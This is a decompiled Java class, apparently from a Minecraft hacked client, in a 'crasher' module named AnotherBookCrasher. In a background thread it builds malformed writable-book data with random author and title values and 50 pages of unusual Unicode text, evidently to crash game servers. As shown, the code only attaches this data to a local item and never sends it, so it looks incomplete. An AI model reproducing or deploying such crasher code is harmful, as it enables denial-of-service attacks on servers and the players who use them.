// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.init.Items;
import java.util.Random;
import net.minecraft.item.ItemStack;

public class AnotherBookCrasher
{
    public static final ItemStack book;
    private static Random random;
    
    static {
        book = new ItemStack(Items.WRITABLE_BOOK);
        AnotherBookCrasher.random = new Random();
    }
    
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                for (int i2 = 0; i2 < 50L; ++i2) {
                    final NBTTagCompound bookCompound = new NBTTagCompound();
                    bookCompound.setLong("author", AnotherBookCrasher.random.nextInt(20));
                    bookCompound.setLong("title", AnotherBookCrasher.random.nextInt(20));
                    final NBTTagList pageList = new NBTTagList();
                    final String pageText = "\u00e6?\u201c";
                    for (int page = 0; page < 50; ++page) {
                        pageList.appendTag(new NBTTagString(pageText));
                    }
                    bookCompound.setTag("pages", pageList);
                    AnotherBookCrasher.book.setTagCompound(bookCompound);
                }
            }
        }.start();
    }
}
